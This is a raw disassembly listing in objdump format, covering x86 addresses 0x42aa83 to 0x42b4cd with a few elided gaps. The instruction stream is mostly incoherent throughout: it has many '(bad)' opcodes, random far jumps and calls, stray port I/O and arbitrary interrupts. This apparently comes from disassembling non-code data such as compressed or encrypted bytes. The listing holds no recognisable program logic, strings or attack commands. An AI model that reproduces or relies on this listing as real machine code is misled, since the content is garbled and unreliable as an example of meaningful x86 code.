  42aa83:	scas   eax,DWORD PTR es:[edi]
  42aa84:	test   al,0x2
  42aa86:	pop    ebx
  42aa87:	and    BYTE PTR [ebp+0x46],ch
  42aa8a:	mov    ds,WORD PTR [eax-0x3c]
  42aa8d:	xchg   ecx,esi
  42aa8f:	imul   edi,DWORD PTR [edx-0x3610bbc3],0x6
  42aa96:	mov    dh,0x63
  42aa98:	in     al,dx
  42aa99:	and    esi,esi
  42aa9b:	and    eax,0x462631e2
  42aaa0:	dec    eax
  42aaa1:	sbb    esi,DWORD PTR [ecx+edx*4+0x19]
  42aaa5:	das    
  42aaa6:	add    ecx,DWORD PTR [ebx]
  42aaa8:	in     al,dx
  42aaa9:	mov    cl,0x7f
  42aaab:	dec    edi
  42aaac:	arpl   WORD PTR [eax],sp
  42aaae:	daa    
  42aaaf:	int3   
  42aab0:	retf   
  42aab1:	jno    0x42ab13
  42aab3:	jb     0x42ab0f
  42aab5:	mov    dl,0xa1
  42aab7:	inc    esp
  42aab8:	mov    eax,0x3454873d
  42aabd:	ffreep st(0)
  42aabf:	sub    DWORD PTR [ebx-0x3c],0x57
  42aac3:	pop    esp
  42aac4:	rcr    BYTE PTR [edx-0x5a],cl
  42aac7:	mov    ds:0x2610cf64,eax
  42aacc:	xor    ebx,0x29c43ff
  42aad2:	nop
  42aad3:	dec    ecx
  42aad4:	cmp    dl,BYTE PTR [ebx]
  42aad6:	cmp    ah,bh
  42aad8:	xor    DWORD PTR [ebp-0x69],edi
  42aadb:	adc    al,0xf0
  42aadd:	ss ja  0x42aace
  42aae0:	aaa    
  42aae1:	adc    al,0x54
  42aae3:	fs inc edi
  42aae5:	(bad)  
  42aae6:	mov    dh,0x79
  42aae8:	and    dl,BYTE PTR [edi]
  42aaea:	mov    al,ds:0xf68db6e3
  42aaef:	push   0xa75e57ca
  42aaf4:	ss lock sbb DWORD PTR ds:[edx+0x16],edx
  42aafa:	repnz xlat BYTE PTR ds:[ebx]
  42aafc:	pusha  
  42aafd:	lods   eax,DWORD PTR ds:[esi]
  42aafe:	push   ds
  42aaff:	fist   WORD PTR [ecx]
  42ab01:	and    al,0x3d
  42ab04:	bound  esi,QWORD PTR [edx+0x3f]
  42ab07:	retf   
  42ab08:	and    DWORD PTR [edi-0x58f13d48],ecx
  42ab0e:	int3   
  42ab0f:	outs   dx,DWORD PTR ds:[esi]
  42ab10:	and    eax,0x0
	...
  42ab71:	add    BYTE PTR [eax],al
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	js     0x42ab42
  42ab82:	adc    al,0xb5
  42ab84:	fwait
  42ab85:	leave  
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    eax,0xbe000001
  42ab8d:	lea    esi,[esi]
  42ab8f:	mov    edi,esp
  42ab91:	ret    
  42ab92:	outs   dx,DWORD PTR ds:[esi]
  42ab93:	mov    ch,0x34
  42ab95:	arpl   ax,ax
  42ab97:	popa   
  42ab98:	in     al,dx
  42ab99:	pushf  
  42ab9a:	stos   BYTE PTR es:[edi],al
  42ab9b:	dec    eax
  42ab9c:	or     BYTE PTR [edx],bl
  42ab9e:	push   es
  42ab9f:	mov    eax,ds:0x4ee75323
  42aba4:	out    0x9c,eax
  42aba6:	adc    cl,0x6e
  42aba9:	ja     0x42ab6f
  42abab:	fist   DWORD PTR [edx+0x1134ed19]
  42abb1:	shl    BYTE PTR [ecx+0x14],cl
  42abb4:	test   BYTE PTR [ecx+eax*8+0x41bce14],bh
  42abbb:	inc    esp
  42abbc:	jmp    FWORD PTR [ecx+0x16]
  42abbf:	fwait
  42abc0:	test   BYTE PTR [edx+eiz*8+0x5c5487ca],0x48
  42abc8:	cmc    
  42abc9:	push   ebp
  42abca:	and    ah,bl
  42abcc:	data16 cld 
  42abce:	adc    al,BYTE PTR [ecx+0x6303d5ce]
  42abd4:	mov    esp,0xb64a4d7d
  42abd9:	jb     0x42ac23
  42abdb:	test   eax,0xfe2e2a89
  42abe0:	and    BYTE PTR [edi],0xcc
  42abe3:	iretw  
  42abe5:	imul   ebp,DWORD PTR [edx],0xd
  42abe8:	inc    esp
  42abe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42abea:	add    al,0xa5
  42abec:	scas   eax,DWORD PTR es:[edi]
  42abed:	(bad)  
  42abee:	das    
  42abef:	sbb    al,0x1a
  42abf1:	add    DWORD PTR [eax-0x5],edi
  42abf4:	sub    edx,DWORD PTR [esi-0x6f]
  42abf7:	int3   
  42abf8:	xor    ah,BYTE PTR [ecx+0xa]
  42abfb:	unpcklps xmm4,xmm2
  42abfe:	lea    eax,[esi-0x598e96e4]
  42ac04:	jg     0x42abf9
  42ac06:	push   0x3825f8d8
  42ac0b:	and    esp,DWORD PTR [ecx+eiz*2-0xd]
  42ac0f:	sub    BYTE PTR [ebx+0x4a],al
  42ac12:	push   0xfffffffd
  42ac14:	clc    
  42ac15:	jmp    0x76a2:0xaa20c1d9
  42ac1c:	int3   
  42ac1d:	jmp    0x42ac2a
  42ac1f:	add    BYTE PTR [ecx-0x343632e6],al
  42ac25:	adc    eax,0xd57d53bd
  42ac2a:	cmc    
  42ac2b:	push   ss
  42ac2c:	mov    bl,0xc0
  42ac2e:	xchg   ebp,eax
  42ac2f:	ficomp WORD PTR [eax+0x60b9ad84]
  42ac35:	inc    eax
  42ac36:	mov    eax,DWORD PTR [edx]
  42ac38:	add    eax,0xa62ce55f
  42ac3d:	inc    esp
  42ac3e:	push   ebx
  42ac3f:	xor    eax,0x2afa9499
  42ac44:	mov    ch,0x8e
  42ac46:	loope  0x42abff
  42ac48:	lea    ebp,[ebp+0x2]
  42ac4b:	or     eax,0xaa874711
  42ac50:	imul   esp,esp,0x8f0b68e3
  42ac56:	or     DWORD PTR [esi-0x4d2267bb],eax
  42ac5c:	sbb    al,0xfd
  42ac5e:	add    edi,edi
  42ac60:	retf   0xe0a9
  42ac63:	outs   dx,BYTE PTR ds:[esi]
  42ac64:	jmp    0xe0d:0xbf4f930e
  42ac6b:	push   ds
  42ac6c:	push   cs
  42ac6d:	imul   bx,ax,0x28
  42ac71:	pop    ds
  42ac72:	sub    esp,DWORD PTR [edi+0x430e3f27]
  42ac78:	mov    ds,WORD PTR [ebx+0x7ebb0921]
  42ac7e:	push   ebx
  42ac7f:	jns    0x42ac80
  42ac81:	(bad)  
  42ac82:	cli    
  42ac83:	cmp    eax,0xfbccca36
  42ac88:	inc    eax
  42ac89:	ja     0x42ac5e
  42ac8b:	retf   
  42ac8c:	mov    DWORD PTR [ebx],edx
  42ac8e:	inc    ecx
  42ac8f:	js     0x42ac1c
	...
  42acf1:	add    BYTE PTR [eax],al
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	sub    dh,BYTE PTR [ebx-0x355fecfa]
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    eax,0xf4000001
  42ad0d:	int3   
  42ad0e:	inc    esp
  42ad0f:	into   
  42ad10:	sub    eax,0x21d3f34c
  42ad15:	nop
  42ad16:	(bad)  
  42ad17:	lds    edi,FWORD PTR [eax+0x55]
  42ad1a:	les    esp,FWORD PTR [ecx]
  42ad1c:	test   BYTE PTR [ebp-0x1ad0779],ah
  42ad22:	push   ecx
  42ad23:	daa    
  42ad24:	ds sbb al,0x4f
  42ad27:	mov    ch,0xe6
  42ad29:	xor    eax,0x69c89868
  42ad2e:	aaa    
  42ad2f:	out    0x8d,al
  42ad31:	dec    edx
  42ad32:	(bad)  
  42ad33:	shr    BYTE PTR [ecx-0x4cb457a3],0xd0
  42ad3a:	xor    al,0xe
  42ad3c:	sub    DWORD PTR [ebx],esi
  42ad3e:	mov    ebp,0xff7aefb5
  42ad43:	push   esp
  42ad44:	lods   eax,DWORD PTR ds:[esi]
  42ad45:	push   0xa33856b1
  42ad4a:	mov    edx,0xd69d5c13
  42ad4f:	xchg   DWORD PTR ds:0xa168aa6f,ecx
  42ad55:	bound  eax,QWORD PTR [ebx+0x25]
  42ad58:	inc    ebp
  42ad59:	loope  0x42ad13
  42ad5b:	leave  
  42ad5c:	pop    esi
  42ad5d:	xchg   ecx,eax
  42ad5e:	lahf   
  42ad5f:	mov    esp,DWORD PTR [ebp+0x305c528e]
  42ad65:	int    0xe3
  42ad67:	xchg   DWORD PTR [ecx],esi
  42ad69:	or     DWORD PTR [eax-0x7],ebp
  42ad6c:	cmp    DWORD PTR [ecx],0xffffffc2
  42ad6f:	out    dx,eax
  42ad70:	aad    0x7c
  42ad72:	jle    0x42ad05
  42ad74:	loopne 0x42ad8d
  42ad76:	mov    edi,0x7cfd216a
  42ad7b:	repz mov ss,edi
  42ad7e:	popf   
  42ad7f:	dec    edi
  42ad80:	pop    ecx
  42ad81:	(bad)  
  42ad82:	int3   
  42ad83:	and    BYTE PTR [ebp-0x1e],0x1
  42ad87:	adc    eax,0x48cc7d9e
  42ad8c:	xchg   ecx,eax
  42ad8d:	rcl    ebp,1
  42ad8f:	es lock into 
  42ad92:	clc    
  42ad93:	ja     0x42ade9
  42ad95:	ins    BYTE PTR es:[edi],dx
  42ad96:	fcomi  st,st(0)
  42ad98:	push   eax
  42ad99:	or     cl,BYTE PTR [edx]
  42ad9b:	dec    DWORD PTR [esi-0x538aaff9]
  42ada1:	out    dx,al
  42ada2:	push   ebp
  42ada3:	inc    ebx
  42ada4:	iret   
  42ada5:	push   ecx
  42ada6:	rol    DWORD PTR [ebx-0x63910ec9],1
  42adac:	aas    
  42adad:	jb     0x42ad5b
  42adaf:	xlat   BYTE PTR ds:[ebx]
  42adb0:	gs pop ecx
  42adb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42adb3:	call   0x12d76dc1
  42adb8:	(bad)  
  42adb9:	test   BYTE PTR cs:[esi+0x6206e745],cl
  42adc0:	xor    al,0xde
  42adc2:	mov    dl,0xd2
  42adc4:	cwde   
  42adc5:	bound  esi,QWORD PTR [eax]
  42adc7:	xchg   ebp,eax
  42adc8:	lods   al,BYTE PTR ds:[esi]
  42adc9:	pop    edx
  42adca:	or     eax,0x4cdc1e89
  42adcf:	sub    ebp,DWORD PTR [ecx]
  42add1:	inc    ebp
  42add2:	ret    0x24de
  42add5:	dec    ecx
  42add6:	mov    esi,edx
  42add8:	mov    esi,0x314bf234
  42addd:	stos   BYTE PTR es:[edi],al
  42adde:	mov    bl,0xb8
  42ade0:	mov    al,ds:0xba880dfa
  42ade5:	nop
  42ade6:	cwde   
  42ade7:	inc    ebx
  42ade8:	cli    
  42ade9:	stc    
  42adea:	int    0xe0
  42adec:	nop
  42aded:	in     ax,dx
  42adef:	and    al,0xa8
  42adf1:	scas   al,BYTE PTR es:[edi]
  42adf2:	lods   al,BYTE PTR ds:[esi]
  42adf3:	mul    BYTE PTR [eax]
  42adf5:	xchg   edx,eax
  42adf6:	jo     0x42ad80
  42adf8:	stos   BYTE PTR es:[edi],al
  42adf9:	dec    ebp
  42adfa:	jns    0x42ae02
  42adfc:	mov    al,0x11
  42adfe:	scas   eax,DWORD PTR es:[edi]
  42adff:	or     dl,BYTE PTR [edi-0x48d7682e]
  42ae05:	icebp  
  42ae06:	adc    eax,edi
  42ae08:	mov    edx,0x3bba17f1
  42ae0d:	test   BYTE PTR [esp+ecx*2+0x4],0x0
	...
  42ae72:	add    BYTE PTR [eax],al
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	adc    esi,DWORD PTR [ecx+edx*8-0xc]
  42ae84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ae85:	retf   
  42ae86:	add    DWORD PTR [eax],eax
  42ae88:	add    eax,0x25000001
  42ae8d:	dec    ebp
  42ae8e:	ins    DWORD PTR es:[edi],dx
  42ae8f:	mov    WORD PTR [ecx],cs
  42ae91:	inc    edi
  42ae92:	adc    ebx,DWORD PTR [edi-0x1a]
  42ae95:	xchg   esi,eax
  42ae96:	stos   BYTE PTR es:[edi],al
  42ae97:	mov    ds:0x708a15a5,al
  42ae9c:	mov    esi,0xde64a100
  42aea1:	pop    es
  42aea2:	pop    esp
  42aea3:	pop    esi
  42aea4:	(bad)  
  42aea5:	jmp    0x42aefe
  42aea7:	add    al,0xd5
  42aea9:	es (bad) 
  42aeac:	xchg   edi,eax
  42aeae:	push   ecx
  42aeaf:	ror    DWORD PTR [ebp-0x29cca041],cl
  42aeb5:	and    al,0xc5
  42aeb7:	mov    al,ds:0xd97ebda9
  42aebc:	cmp    al,0xcc
  42aebe:	jbe    0x42af0c
  42aec0:	retf   0x5225
  42aec3:	mov    al,0xe2
  42aec5:	adc    DWORD PTR [eax],ebp
  42aec7:	je     0x42af3f
  42aec9:	and    DWORD PTR [eax+0x1916292f],ebx
  42aecf:	leave  
  42aed0:	jnp    0x42aee5
  42aed2:	aas    
  42aed3:	jae    0x42aed1
  42aed5:	adc    ecx,DWORD PTR [edi]
  42aed7:	fsubr  QWORD PTR ds:0x6114640
  42aedd:	cmp    esi,DWORD PTR [ebp-0x1d880dd9]
  42aee3:	popa   
  42aee4:	mov    ds:0xf9048ef7,al
  42aee9:	xchg   ecx,ebp
  42aeeb:	fmulp  st(5),st
  42aeed:	dec    edi
  42aeee:	das    
  42aeef:	add    esi,DWORD PTR [ebp-0x2756d320]
  42aef5:	push   edi
  42aef6:	dec    esi
  42aef7:	mov    ds:0x1b81585e,eax
  42aefc:	fs stc 
  42aefe:	xor    ebp,eax
  42af00:	not    BYTE PTR [edx-0x66]
  42af03:	jno    0x42af0f
  42af05:	pop    ebx
  42af06:	(bad)  
  42af07:	aam    0xdc
  42af09:	ror    DWORD PTR [esi+eax*4+0x7a34a634],0x3
  42af11:	sub    BYTE PTR [ebx+0x5ea573f7],ah
  42af17:	mov    bl,ch
  42af19:	mov    eax,ds:0xf823de00
  42af1e:	lock sub dh,ah
  42af21:	xchg   BYTE PTR [esp+esi*4],dl
  42af24:	mov    bl,0x8c
  42af26:	jno    0x42af27
  42af28:	scas   eax,DWORD PTR es:[edi]
  42af29:	sub    ah,BYTE PTR [bx+0x5e6d]
  42af2e:	add    al,0x68
  42af30:	mov    BYTE PTR [edi],cl
  42af32:	repz mov al,0xec
  42af35:	iret   
  42af36:	lods   al,BYTE PTR ds:[esi]
  42af37:	and    ah,0xd2
  42af3a:	add    al,BYTE PTR [ebp+eiz*2+0x17]
  42af3e:	cmc    
  42af3f:	inc    edi
  42af40:	dec    esi
  42af41:	in     eax,dx
  42af42:	repnz aam 0x23
  42af45:	nop
  42af46:	cmp    al,0xd9
  42af48:	stc    
  42af49:	mov    ds:0xf312494b,al
  42af4e:	sbb    eax,0x3ea1071b
  42af53:	sti    
  42af54:	pop    es
  42af55:	jl     0x42af68
  42af57:	add    edi,ebx
  42af59:	sub    BYTE PTR [edx-0x3d],0x2
  42af5d:	not    dh
  42af5f:	mov    ah,0xfb
  42af61:	xlat   BYTE PTR ds:[ebx]
  42af62:	add    al,ch
  42af64:	lods   al,BYTE PTR ds:[esi]
  42af65:	jno    0x42afab
  42af67:	mov    esi,0x616e0707
  42af6c:	fcmovb st,st(3)
  42af6e:	push   eax
  42af6f:	or     edx,DWORD PTR [esi-0x1dc62dc4]
  42af75:	out    0xf9,al
  42af77:	jl     0x42af74
  42af79:	pop    eax
  42af7a:	dec    esi
  42af7b:	aas    
  42af7c:	xchg   ecx,eax
  42af7d:	clc    
  42af7e:	bound  ecx,QWORD PTR [edi-0x517671a4]
  42af84:	sti    
  42af85:	push   ss
  42af86:	mov    ecx,0x2bd35dd6
  42af8b:	ds int3 
  42af8d:	les    edx,FWORD PTR [eax+0x7843]
	...
  42aff3:	add    cl,bh
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	push   edx
  42b001:	scas   al,BYTE PTR es:[edi]
  42b002:	cwde   
  42b003:	fldcw  WORD PTR [edx+0x50001cc]
  42b009:	add    DWORD PTR [eax],eax
  42b00b:	add    bh,cl
  42b00d:	xchg   ebx,eax
  42b00e:	lods   eax,DWORD PTR ds:[esi]
  42b00f:	sahf   
  42b010:	(bad)  
  42b011:	imul   ebp,DWORD PTR [ecx],0xffffffe8
  42b014:	or     al,0x8e
  42b016:	add    al,0xf2
  42b018:	fld    QWORD PTR [ecx+0x45b232c0]
  42b01e:	shr    BYTE PTR [eax+edi*4+0x5e],0x87
  42b023:	lods   al,BYTE PTR ds:[esi]
  42b024:	mov    ebx,0xdbc26f4
  42b029:	dec    esp
  42b02a:	nop
  42b02b:	and    ah,BYTE PTR [eax]
  42b02d:	imul   esi,DWORD PTR [ebx],0xffffffb5
  42b030:	test   al,0xd7
  42b032:	mov    WORD PTR fs:[ecx],cs
  42b035:	out    0x7,eax
  42b037:	jnp    0x42afd2
  42b039:	retf   0x1782
  42b03c:	mul    BYTE PTR [ebx+0x5c0586a9]
  42b042:	repz cmp al,0xef
  42b045:	mov    ecx,0x807f70a4
  42b04a:	sub    ah,BYTE PTR ds:0x2a4eedb4
  42b050:	std    
  42b051:	lds    eax,FWORD PTR [eax]
  42b053:	jg     0x42b048
  42b055:	addr16 inc ebx
  42b057:	mov    BYTE PTR [edx-0x1c],ch
  42b05a:	loopne 0x42b00a
  42b05c:	or     dl,bl
  42b05e:	stc    
  42b05f:	xor    bl,dh
  42b061:	or     eax,0xed78f788
  42b066:	je     0x42b00e
  42b068:	popf   
  42b069:	lods   al,BYTE PTR ds:[esi]
  42b06a:	ins    BYTE PTR es:[edi],dx
  42b06b:	and    ebp,eax
  42b06d:	dec    ecx
  42b06e:	inc    edi
  42b06f:	scas   eax,DWORD PTR es:[edi]
  42b070:	rcr    BYTE PTR ds:0xa418270a,1
  42b076:	loop   0x42b01b
  42b078:	dec    eax
  42b079:	cmove  ebx,esi
  42b07c:	aas    
  42b07d:	adc    BYTE PTR [esi],cl
  42b07f:	stc    
  42b080:	cld    
  42b081:	bnd jnp 0x42b0d2
  42b084:	rcl    esp,0x31
  42b087:	rcr    DWORD PTR [ecx+0x1],1
  42b08a:	sbb    DWORD PTR [esi+0x2182525a],0x43fcfd85
  42b094:	mov    ebx,0xb3a8ca02
  42b099:	sub    eax,0xe1e892f3
  42b09e:	es repz push 0x2cf41908
  42b0a5:	mov    WORD PTR ds:0xa5d41ae8,gs
  42b0ab:	adc    eax,0x82c08066
  42b0b0:	dec    edi
  42b0b1:	cwde   
  42b0b2:	lods   al,BYTE PTR ds:[esi]
  42b0b3:	xbegin 0xaf8268b2
  42b0b9:	push   edi
  42b0ba:	mov    edi,es
  42b0bc:	mov    ch,0x2e
  42b0be:	into   
  42b0bf:	pop    es
  42b0c0:	test   DWORD PTR [edx-0x139b77fe],eax
  42b0c6:	sar    BYTE PTR [edx+ecx*4],1
  42b0c9:	shl    DWORD PTR [edx+0x5a],cl
  42b0cc:	enter  0xd721,0x7c
  42b0d0:	fild   QWORD PTR [esp+edx*8-0x3]
  42b0d4:	push   0xffffff80
  42b0d6:	cdq    
  42b0d7:	xor    ebx,esp
  42b0d9:	ret    0x4de1
  42b0dc:	mov    ebx,0x583c4859
  42b0e1:	fmulp  st(7),st
  42b0e3:	imul   edx,DWORD PTR [ecx],0x91a9505b
  42b0e9:	leave  
  42b0ea:	leave  
  42b0eb:	adc    DWORD PTR [edx-0x3d00a1ae],ebx
  42b0f1:	push   0xd2e58165
  42b0f6:	mov    al,ds:0x1294f6b2
  42b0fb:	int    0xcd
  42b0fd:	cwde   
  42b0fe:	pop    edx
  42b0ff:	push   esi
  42b100:	mov    DWORD PTR [ecx],0xc34921a2
  42b106:	data16 mov al,fs:0x62a3751c
  42b10d:	mov    ebp,0x9646c7
	...
  42b172:	add    BYTE PTR [eax],al
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	fs lahf 
  42b182:	sti    
  42b183:	pop    ebp
  42b184:	scas   eax,DWORD PTR es:[edi]
  42b185:	int    0x1
  42b187:	add    BYTE PTR ds:0x15000001,al
  42b18d:	clc    
  42b18e:	(bad)  
  42b18f:	cmc    
  42b190:	dec    ebx
  42b191:	push   ds
  42b192:	push   0xfffffffb
  42b194:	lods   eax,DWORD PTR ds:[esi]
  42b195:	push   ds
  42b196:	cmp    edi,DWORD PTR [eax-0x6a472837]
  42b19c:	xor    al,dl
  42b19e:	or     al,0xa6
  42b1a0:	ret    0xcadb
  42b1a3:	repz pop esp
  42b1a5:	dec    eax
  42b1a6:	pop    esp
  42b1a7:	pop    esi
  42b1a8:	inc    ecx
  42b1a9:	jl     0x42b218
  42b1ab:	es xchg ebp,eax
  42b1ad:	int    0x41
  42b1af:	aad    0x8d
  42b1b1:	and    eax,0xe836d05c
  42b1b6:	retf   0x6f12
  42b1b9:	mov    ah,0xb8
  42b1bb:	push   ecx
  42b1bc:	int3   
  42b1bd:	lock sbb edi,edi
  42b1c0:	add    eax,DWORD PTR [ebx-0x2f]
  42b1c3:	imul   ebp,DWORD PTR [esp+ebx*2],0x5222d13c
  42b1ca:	dec    ebx
  42b1cb:	cwde   
  42b1cc:	jge    0x42b1ef
  42b1ce:	mov    ecx,0x3f5bd24b
  42b1d3:	loopne 0x42b23a
  42b1d5:	es dec ebp
  42b1d7:	leave  
  42b1d8:	inc    edx
  42b1d9:	imul   dl
  42b1db:	hlt    
  42b1dc:	into   
  42b1dd:	dec    esi
  42b1de:	push   ebx
  42b1df:	and    eax,0x91fec03a
  42b1e4:	push   ds
  42b1e5:	fcomi  st,st(2)
  42b1e7:	scas   eax,DWORD PTR es:[edi]
  42b1e8:	fadd   st,st(2)
  42b1ea:	js     0x42b1d6
  42b1ec:	je     0x42b225
  42b1ee:	fisub  WORD PTR [edx+0x6d]
  42b1f1:	add    dl,BYTE PTR ds:0x31ea6c15
  42b1f7:	and    al,ah
  42b1f9:	jge    0x42b1ee
  42b1fb:	mov    ebx,es
  42b1fd:	xchg   DWORD PTR [ebp+0x2c],edx
  42b200:	es adc eax,0x4ea8f4f6
  42b206:	call   0x485d:0xa6916d9f
  42b20d:	inc    esi
  42b20e:	shr    BYTE PTR ds:0x92a7e20e,1
  42b214:	or     BYTE PTR [edi+ebx*2],dl
  42b217:	pushf  
  42b218:	and    BYTE PTR [eax-0x66],ch
  42b21b:	jp     0x42b1a8
  42b21d:	adc    ebx,DWORD PTR [edx+eiz*1+0x11006e60]
  42b224:	cs adc al,cl
  42b227:	and    eax,DWORD PTR [esi+0x13a5b6dd]
  42b22d:	nop
  42b22e:	xlat   BYTE PTR ds:[ebx]
  42b22f:	call   0x12d6:0xbade00e1
  42b236:	push   ebx
  42b237:	or     BYTE PTR [ebx*4+0x14312eca],bh
  42b23e:	fisub  WORD PTR [esp+ebx*2-0x44]
  42b242:	leave  
  42b243:	xor    BYTE PTR [edi+0x4b42744f],ch
  42b249:	vpmullw ymm7,ymm2,YMMWORD PTR [eax-0x3d]
  42b24e:	jge    0x42b23e
  42b250:	int3   
  42b251:	icebp  
  42b252:	pextrw ebx,(bad),0xc5
  42b254:	call   0x7b0a:0x35f3c460
  42b25b:	in     eax,0x73
  42b25d:	leave  
  42b25e:	jb     0x42b2b0
  42b260:	imul   edi,DWORD PTR [esi],0x49
  42b263:	fisttp WORD PTR [eax-0x6d5689ba]
  42b269:	mov    cl,0x4
  42b26b:	dec    eax
  42b26c:	mov    ds:0x30cdf9ae,eax
  42b271:	arpl   WORD PTR [ebx+0x76738d99],di
  42b277:	jnp    0x42b2f1
  42b279:	push   ds
  42b27a:	dec    esi
  42b27b:	sar    DWORD PTR ds:0x40294e07,0x11
  42b282:	or     BYTE PTR [edi-0x51617382],dh
  42b288:	cdq    
  42b289:	jno    0x42b25d
  42b28b:	cmp    esi,ebx
  42b28d:	pop    ebx
  42b28e:	mov    al,0x14
  42b290:	or     eax,DWORD PTR [eax]
	...
  42b2f2:	add    BYTE PTR [eax],al
  42b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2f5:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b2fb:	iret   
  42b2fc:	sub    eax,0x24738e65
  42b301:	test   eax,0xceb4e25b
  42b306:	add    DWORD PTR [eax],eax
  42b308:	add    eax,0x69000001
  42b30d:	jo     0x42b367
  42b30f:	pop    esp
  42b310:	inc    edi
  42b311:	data16 jb 0x42b390
  42b314:	jmp    FWORD PTR [ebx+0xf752c26]
  42b31a:	inc    ebp
  42b31b:	pop    edi
  42b31c:	add    eax,0x98ba29c3
  42b321:	imul   edi,edx,0xffffff96
  42b324:	jmp    0x42b334
  42b326:	push   0xffffff92
  42b328:	add    ah,BYTE PTR [ecx]
  42b32a:	pop    ss
  42b32b:	scas   al,BYTE PTR es:[edi]
  42b32c:	sub    BYTE PTR [esi-0x7f],dl
  42b32f:	add    WORD PTR ds:0xd2a74b19,dx
  42b336:	pop    ecx
  42b337:	sub    eax,0x26d56358
  42b33c:	nop
  42b33d:	sar    BYTE PTR [edx],cl
  42b33f:	mov    esi,0xc57256b4
  42b344:	push   ds
  42b345:	out    dx,al
  42b346:	mov    esp,DWORD PTR [ebx-0x1f]
  42b349:	stc    
  42b34a:	rcr    BYTE PTR [eax],cl
  42b34c:	sbb    al,0xec
  42b34e:	fist   WORD PTR [edi]
  42b350:	mov    ebx,0x653a2b19
  42b355:	mov    eax,DWORD PTR [ebx+0x50da8650]
  42b35b:	xchg   ecx,eax
  42b35c:	pop    esp
  42b35d:	add    eax,0x1cee73d3
  42b362:	jg     0x42b329
  42b364:	add    esp,DWORD PTR ds:0x601a0462
  42b36a:	push   ebp
  42b36b:	adc    DWORD PTR ds:0x93e3a7c8,edx
  42b371:	into   
  42b372:	arpl   WORD PTR [eax-0x4b535e6f],ax
  42b378:	pop    ss
  42b379:	(bad)  
  42b37a:	xchg   ecx,eax
  42b37b:	xor    eax,0xddd80529
  42b380:	mov    edi,0xd52c7dba
  42b385:	mov    esp,0xa43483e6
  42b38a:	dec    ebx
  42b38b:	repz xlat BYTE PTR ds:[ebx]
  42b38d:	sbb    dl,ah
  42b38f:	pop    edi
  42b390:	call   0xe4a:0xeb127039
  42b397:	adc    DWORD PTR [edi-0x3a0c04df],eax
  42b39d:	jl     0x42b364
  42b39f:	push   es
  42b3a0:	sti    
  42b3a1:	mov    edi,0x4c5695ee
  42b3a6:	mov    bl,0x4b
  42b3a8:	(bad)
  42b3ab:	out    0x8a,al
  42b3ad:	shr    eax,cl
  42b3af:	add    ebp,DWORD PTR [ebp+0x5f]
  42b3b2:	ja     0x42b3b5
  42b3b4:	into   
  42b3b5:	cmc    
  42b3b6:	mov    DWORD PTR [eax-0x3b],0x92d7f8e8
  42b3bd:	sti    
  42b3be:	and    dl,dh
  42b3c0:	mov    bl,BYTE PTR [edi-0x33c669]
  42b3c6:	or     DWORD PTR [eax+0x20fc87dd],edi
  42b3cc:	or     cl,BYTE PTR [ebx-0x80]
  42b3cf:	adc    DWORD PTR [edx-0x31],edi
  42b3d2:	xor    ah,BYTE PTR [esi+0x30570889]
  42b3d8:	sub    eax,0x2997c587
  42b3dd:	pop    ebp
  42b3de:	add    ecx,DWORD PTR [ecx]
  42b3e0:	stos   DWORD PTR es:[edi],eax
  42b3e1:	mov    dh,0x47
  42b3e3:	and    BYTE PTR [ecx],dl
  42b3e5:	xchg   esp,eax
  42b3e6:	pop    ecx
  42b3e7:	les    edx,FWORD PTR [edx+0x2de20801]
  42b3ed:	adc    eax,0xb55c3293
  42b3f2:	aam    0x6b
  42b3f4:	hlt    
  42b3f5:	pop    eax
  42b3f6:	adc    al,0xd7
  42b3f8:	jns    0x42b3a7
  42b3fa:	lea    ebx,[edx-0x20573a60]
  42b400:	cli    
  42b401:	leave  
  42b402:	stos   DWORD PTR es:[edi],eax
  42b403:	mov    ebx,0x8e839a90
  42b408:	(bad)  
  42b409:	daa    
  42b40a:	mov    eax,0xfb0a811e
  42b40f:	cld    
  42b410:	leave  
	...
  42b471:	add    BYTE PTR [eax],al
  42b473:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   ebx,ecx
  42b481:	pusha  
  42b482:	imul   edi,ecx,0x1cfb9
  42b488:	add    eax,0xca000001
  42b48d:	or     bh,bh
  42b48f:	or     BYTE PTR [eax+0x50],al
  42b492:	pop    eax
  42b493:	sbb    eax,0x9a14e987
  42b498:	pop    edi
  42b499:	fucomi st,st(0)
  42b49b:	pop    ebp
  42b49c:	sub    esi,DWORD PTR [edx]
  42b49e:	cld    
  42b49f:	(bad)  gs:[eax-0x55]
  42b4a3:	or     eax,0x6c9f2979
  42b4a8:	xor    BYTE PTR [ecx+eiz*8-0xd33a037],0xa5
  42b4b0:	test   eax,0xcc7f86c8
  42b4b5:	aaa    
  42b4b6:	sub    eax,0x958b639f
  42b4bb:	js     0x42b501
  42b4bd:	jnp    0x42b44b
  42b4bf:	xchg   DWORD PTR [edx],edi
  42b4c1:	cmp    eax,0x33ef9d67
  42b4c6:	push   cs
  42b4c7:	jmp    DWORD PTR [ebx+0x36af5838]
  42b4cd:	inc    edi
